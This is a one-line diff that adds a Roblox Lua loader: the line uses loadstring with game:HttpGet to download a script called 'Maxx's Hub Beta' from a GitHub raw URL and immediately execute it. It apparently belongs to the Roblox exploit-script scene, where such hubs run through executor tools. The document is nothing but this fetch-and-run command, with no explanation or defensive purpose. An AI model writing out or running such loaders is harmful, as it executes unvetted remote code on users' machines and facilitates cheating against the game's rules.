@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Maxx01112/Aidens.scripts.rblx/main/Maxx's%20Hub%20Beta"))()
